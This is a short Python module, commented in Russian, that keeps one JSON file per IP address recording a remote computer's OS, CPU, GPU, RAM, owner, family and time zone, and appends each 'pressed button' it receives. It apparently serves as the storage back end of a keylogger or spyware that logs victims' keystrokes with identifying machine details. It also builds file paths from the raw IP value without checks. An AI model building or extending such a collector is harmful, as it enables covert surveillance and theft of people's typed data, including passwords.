import os
import json


def abs_path(file_name):  # Получить абсолютный путь к файлу
    path = os.path.abspath('')
    file_path = f'{path}/{file_name}'
    return file_path


def user_file_check(ip):  # Посмотреть, создан ли файл пользователя
    file = f'database/{ip}.json'
    file_path = abs_path(file)
    is_file_path = os.path.isfile(file_path)
    return is_file_path


def user_file_create(ip, data, data_type,  # Создать файл пользователя
                     sys_os, sys_cpu, sys_gpu, sys_ram, 
                     pc_owner, pc_family, pc_time_zone):
    file = f'database/{ip}.json'
    file_path = abs_path(file)

    file_data = {
        'ip': ip,
        'sys_os': sys_os, 'sys_cpu': sys_cpu, 
        'sys_gpu': sys_gpu, 'sys_ram': sys_ram,
        'pc_owner': pc_owner, 'pc_family': pc_family,
        'pc_time_zone': pc_time_zone,
        'data': {'pressed_buttons': []}
    }

    with open(file_path, mode='w', encoding='utf-8') as write_file:
        json.dump(file_data, write_file, indent=4)

    file_write = user_file_write(ip, data, data_type)
    return file_write


def user_file_write(ip, data, data_type):  # Записать данные в файл пользователя
    file = f'database/{ip}.json'
    file_path = abs_path(file)

    with open(file_path, mode='r', encoding='utf-8') as read_file:
        file_data = json.load(read_file)

    file_data['data']['pressed_buttons'].append(data)

    with open(file_path, mode='w', encoding='utf-8') as write_file:
        json.dump(file_data, write_file, indent=4)

    return True
